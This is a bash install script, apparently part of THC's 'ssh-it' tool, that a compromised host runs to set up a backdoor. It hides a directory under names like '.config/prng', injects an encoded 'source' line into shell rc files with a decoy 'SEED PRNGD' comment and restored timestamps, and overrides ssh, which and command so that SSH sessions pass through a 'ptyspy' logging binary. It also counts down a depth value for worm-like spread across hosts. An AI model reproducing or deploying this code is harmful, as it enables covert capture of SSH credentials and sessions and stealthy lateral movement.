#! /usr/bin/env bash

# This script is executed on a new remote side _before_ binaries have been deployed.
# This script sets up everything on the remote side:
# - Add to ~/.profile
# - link to correct binary for host's architecture.

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

if [[ -z $THC_DEBUG ]]; then
	DEBUGF(){ :;}
	DEBUGF_R(){ :;}
else
	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
	DEBUGF_R(){ echo -e "${CY}DEBUG:${CN} ${CR}$*${CN}";}
fi

OK_OUT()
{
	echo -e 2>&1 "......[${CG}OK${CN}]"
	[[ -n $1 ]] && echo -e 1>&2 "--> $*"
}

install_to_file()
{
	local fname="$1"

	shift 1

	touch -r "${fname}" "${fname}-ts" || return

	D="$(IFS=$'\n'; head -n1 "${fname}" && \
		echo "${*}" && \
		tail -n +2 "${fname}")"
	echo "$D" >"${fname}"

	touch -r "${fname}-ts" "${fname}"
	rm -f "${fname}-ts"
}

rcfile_add()
{
	local rcfile="$1"
	local rcline

	# check that xxd is working as expected (alpine linux does not have -r option)
	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
		# Use absolute path decoding-binary in case PATH is not set when rcfile is
		# evaluated.
		ENC_BIN="$(command -v xxd)"
		rcline=$(echo "${THC_BASEDIR}"'/seed' |xxd -ps -c1024)
		RCLINE_ENC="\$(echo $rcline|${ENC_BIN} -r -ps 2>/dev/null)"
	elif [[ "$(echo "thcwashere" | openssl base64 -A 2>/dev/null| openssl base64 -A -d 2>/dev/null)" = "thcwashere" ]]; then
		ENC_BIN="$(command -v openssl)"
		rcline=$(echo "${THC_BASEDIR}"'/seed' |openssl base64 -A)
		RCLINE_ENC="\$(echo $rcline|${ENC_BIN} base64 -A -d 2>/dev/null)"
	else
		RCLINE_ENC="${THC_BASEDIR}/seed"
	fi

	install_to_file "${rcfile}" "# DO NOT REMOVE THIS LINE. SEED PRNGD." "source \"$RCLINE_ENC\" 2>/dev/null #PRNGD"
}

try_basedir()
{
	[[ -z $1 ]] && return 1

	if [[ ! -d "${1}" ]]; then
		mkdir -p "${1}" 2>/dev/null || return 1 # Can't create directory
	else
		touch "${1}/.write" || return 1 # Not writeable
		rm -f "${1}/.write" 2>/dev/null
	fi

	THC_BASEDIR="${1}"
	DEBUGF "Using THC_BASEDIR=$THC_BASEDIR"
	return 0
}

osarch()
{
	local os;

	# OSARCH already set. Needed when cross compiling to force OSARCH
	[[ -n $OSARCH ]] && { echo "$OSARCH"; return; }
	# Find the correct binary for this architecture and link it
	arch=$(uname -m)
	if [[ $OSTYPE == *linux* ]]; then
		if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
		        os="i386-alpine"
		elif [[ "$arch" == "armv6l" ]] || [[ "$arch" == "armv7l" ]]; then
		        os="armv6l-linux" # RPI-Zero / RPI 4b+
		elif [[ "$arch" == "aarch64" ]]; then
		        os="aarch64-linux"
		elif [[ "$arch" == "mips64" ]]; then
		        os="mips64-alpine"
		elif [[ $arch == *mips* ]]; then
		        os="mips32-alpine"
		fi
	elif [[ $OSTYPE == *darwin* ]]; then
	    if [[ "$arch" == "arm64" ]]; then
	            os="x86_64-osx" # M1
	    else
	            os="x86_64-osx"
	    fi
	elif [[ $OSTYPE == *FreeBSD* ]]; then
	    os="x86_64-freebsd"
	fi

	[[ -z "$os" ]] && os="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit

	echo "$os"
}

[[ "$1" = "osarch" ]] && { osarch; exit; }

[[ -n $THC_LOCAL ]] && echo -en 2>&1 "Installing binaries..................................................."

# Find a writeable base dir
try_basedir "${THC_BASEDIR}" || \
try_basedir "${HOME}/.config/prng" || \
try_basedir "/dev/shm/.prng/u-${UID}" || \
try_basedir "/tmp/.prng/u-${UID}" || \
{ echo >&2 "Can't find a suitable directory. Try THC_BASEDIR=\"\${HOME}/.config/prng\"."; exit 98; }

# deterime if system-side is already installed
# Exit if installed in either of the two system wide include scripts
# [[ -f /etc/bash.bashrc ]] && RCFILE="/etc/bash.bashrc" && grep PRNGD /etc/bash.bashrc &>/dev/null && IS_INSTALLED_RCFILE_SYSTEM=1
[[ -f /etc/profile     ]] && RCFILE_SYSTEM="/etc/profile"     && grep PRNGD /etc/profile     &>/dev/null && IS_INSTALLED_RCFILE_SYSTEM=1

# determine if local is already installed
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ zsh ]] && [[ -f $HOME/.zshrc ]] && RCFILE_USER="${HOME}/.zshrc"
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_profile ]] && RCFILE_USER="${HOME}/.bash_profile"
[[ -z $RCFILE_USER ]] && [[ $SHELL =~ bash ]] && [[ -f $HOME/.bash_login ]] && RCFILE_USER="${HOME}/.bash_login"
[[ -z $RCFILE_USER ]] && [[ -f $HOME/.profile ]] && RCFILE_USER="${HOME}/.profile"
[[ -n $RCFILE_USER ]] && grep PRNGD "${RCFILE_USER}" &>/dev/null && IS_INSTALLED_RCFILE_USER=1

# FIXME: if UID=0 then install systemwide to RCFILE_SYSTEM
RCFILE="$RCFILE_USER"

# no RCFILE found...
if [[ -z $RCFILE ]]; then
	echo >&2 "No rcfile found. Creating ~/.profile"
	#; exit 87; }
	RCFILE="${HOME}/.profile"
	touch "${RCFILE}"
fi

if [[ -z $IS_INSTALLED_RCFILE_SYSTEM ]] && [[ -z $IS_INSTALLED_RCFILE_USER ]]; then
	rcfile_add "$RCFILE"
# FIXME: If root user then try to install globally (if /etc/ is writeabl...).
fi

### Add my stub file that is sourced from rcfile on login
echo "export THC_BASEDIR=\"${THC_BASEDIR}\"
THC_VERBOSE=\"${THC_VERBOSE}\"
[[ -n \"\$THC_VERBOSE\" ]] && export THC_VERBOSE || unset THC_VERBOSE
THC_TESTING=\"${THC_TESTING}\"
[[ -n \"\$THC_TESTING\" ]] && export THC_TESTING || unset THC_TESTING
THC_PS_NAME=\"\$(basename \$SHELL 2>/dev/null)\"
export THC_PS_NAME=\"-\${THC_PS_NAME:-bash}\"
THC_ORIG_SSH=\"\$(command -v ssh)\"
#THC_ORIG_SUDO=\"\$(command -v sudo)\"
unalias which &>/dev/null
thc_set1()
{
	unset -f ssh sudo 2>/dev/null
	ssh()
	{
		if [[ -f \"${THC_BASEDIR}/ssh\" ]]; then
			THC_TARGET=\"\$THC_ORIG_SSH\" \"${THC_BASEDIR}/ssh\" \"\$@\"
		else
			\$THC_ORIG_SSH \"\$@\"
		fi
	}
	#sudo()
	#{
	#	if [[ -f \"${THC_BASEDIR}/sudo\" ]]; then
	#		THC_TARGET=\"\$THC_ORIG_SUDO\" \"${THC_BASEDIR}/sudo\" \"\$@\"
	#	else
	#		\$THC_ORIG_SUDO \"\$@\"
	#	fi
	#}
	which()
	{
		unset -f ssh sudo which command 2>/dev/null
		which \"\$@\" && { thc_set1; true; } || { thc_set1; false; }
	}
	command()
	{
		unset -f ssh sudo which command 2>/dev/null
		command \"\$@\" && { thc_set1; true; } || { thc_set1; false; }
	}
}
thc_set1" >"${THC_BASEDIR}/seed"

[[ -z $FSIZE_BIN ]] && { echo >&2 "FSIZE_BIN not set"; exit 99; }

# Un-block the real ssh (to continue)
[[ -z $THC_LOCAL ]] && echo THCPROFILE

# On OSX, tar wont terminate at end of archive. Thus we need to use FSIZE_BIN to
# kick an EOF to tar.
(cd "$THC_BASEDIR" && { head -c${FSIZE_BIN} | tar xfz -; }) || exit 97
# (cd "$THC_BASEDIR" && tar xf -) || exit 97 # THIS WONT COMPLETE EVER OSX

# Newly backdoored. Decrement depth by 1. This will stop ssh-it when THC_DEPTH hits 0.
[[ -z $THC_DEPTH ]] && { echo >&2 "ERROR: THC_DEPTH not set."; exit 96; }
THC_DEPTH_REMOTE="$THC_DEPTH"
# On THC_LOCAL (local install, not via ssh) deep the current THC_DEPTH (do not decrement)
[[ -z $THC_LOCAL ]] && [[ $THC_DEPTH_REMOTE -gt 0 ]] && THC_DEPTH_REMOTE=$((THC_DEPTH_REMOTE - 1))
# Check if local THC_DEPTH already exists and only update new
# DEPTH is LARGER to prevent DEPTH hitting 0 if A connects -> B -> A -> B..
source "${THC_BASEDIR}/depth.cfg" 2>/dev/null || unset THC_DEPTH
[[ -n $THC_FORCE_UPDATE ]] && unset THC_DEPTH # always use THC_DEPTH_REMOTE
if [[ $THC_DEPTH_REMOTE > $THC_DEPTH ]]; then
	echo "THC_DEPTH=${THC_DEPTH_REMOTE}" >"${THC_BASEDIR}/depth.cfg"
	THC_DEPTH="$THC_DEPTH_REMOTE"
	DEBUGF "Setting THC_DEPTH=$THC_DEPTH"
else
	DEBUGF "Keeping THC_DEPTH=$THC_DEPTH (REMOTE wants $THC_DEPTH_REMOTE)"
fi

OSARCH=$(osarch)

# Test execute on this architecture
THC_EXEC_TEST=1 "${THC_BASEDIR}/ptyspy_bin.${OSARCH}" 2>/dev/null  || { echo >&2 "Failed: ptyspy_bin.${OSARCH}"; exit 127; }

ln -sf "ptyspy_bin.${OSARCH}" "${THC_BASEDIR}/ssh"

if [[ -n $THC_LOCAL ]]; then
	OK_OUT
	echo -e 2>&1 "\
--> Installed to ${CY}${THC_BASEDIR}${CN} and ${CY}${RCFILE}${CN}.
--> Logging to ${CY}${THC_BASEDIR}/.l${CN}
--> Type ${CM}${THC_BASEDIR}/thc_cli -r uninstall${CN} to remove.
--> SSH-IT will start on next log in or to start right
    now type ${CM}source ${THC_BASEDIR}/seed${CN}."
fi

exit 0
